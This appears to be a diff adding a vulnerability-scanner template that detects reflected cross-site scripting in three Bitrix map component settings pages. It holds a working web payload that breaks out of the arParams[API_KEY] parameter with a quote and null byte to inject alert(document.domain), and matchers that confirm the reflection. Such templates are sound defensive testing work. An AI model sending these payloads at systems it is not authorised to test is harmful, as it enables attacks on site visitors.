@@ -1,0 +1,41 @@
+id: bitrix-map-google-xss
+
+info:
+  name: Bitrix map.google.view - Reflected XSS
+  author: krolchonok
+  severity: medium
+  description: |
+    Reflected XSS in bitrix:map.google.view settings via arParams[API_KEY]
+    (null-byte / quote breakout).
+  reference:
+    - https://github.com/cr1f/writeups/blob/main/attacking_bitrix.pdf
+    - https://github.com/k1rurk/check_bitrix
+  classification:
+    cwe-id: CWE-79
+  metadata:
+    max-request: 3
+  tags: bitrix,bitrix24,xss
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/bitrix/components/bitrix/map.google.view/settings/settings.php?arParams[API_KEY]=123'-'%00'-alert(document.domain)-'"
+      - "{{BaseURL}}/bitrix/components/bitrix/map.yandex.view/settings/settings.php?arParams[API_KEY]=123'-'%00'-alert(document.domain)-'"
+      - "{{BaseURL}}/bitrix/components/bitrix/map.google.search/settings/settings.php?arParams[API_KEY]=123'-'%00'-alert(document.domain)-'"
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "alert(document.domain)"
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
+
+      - type: status
+        status:
+          - 200
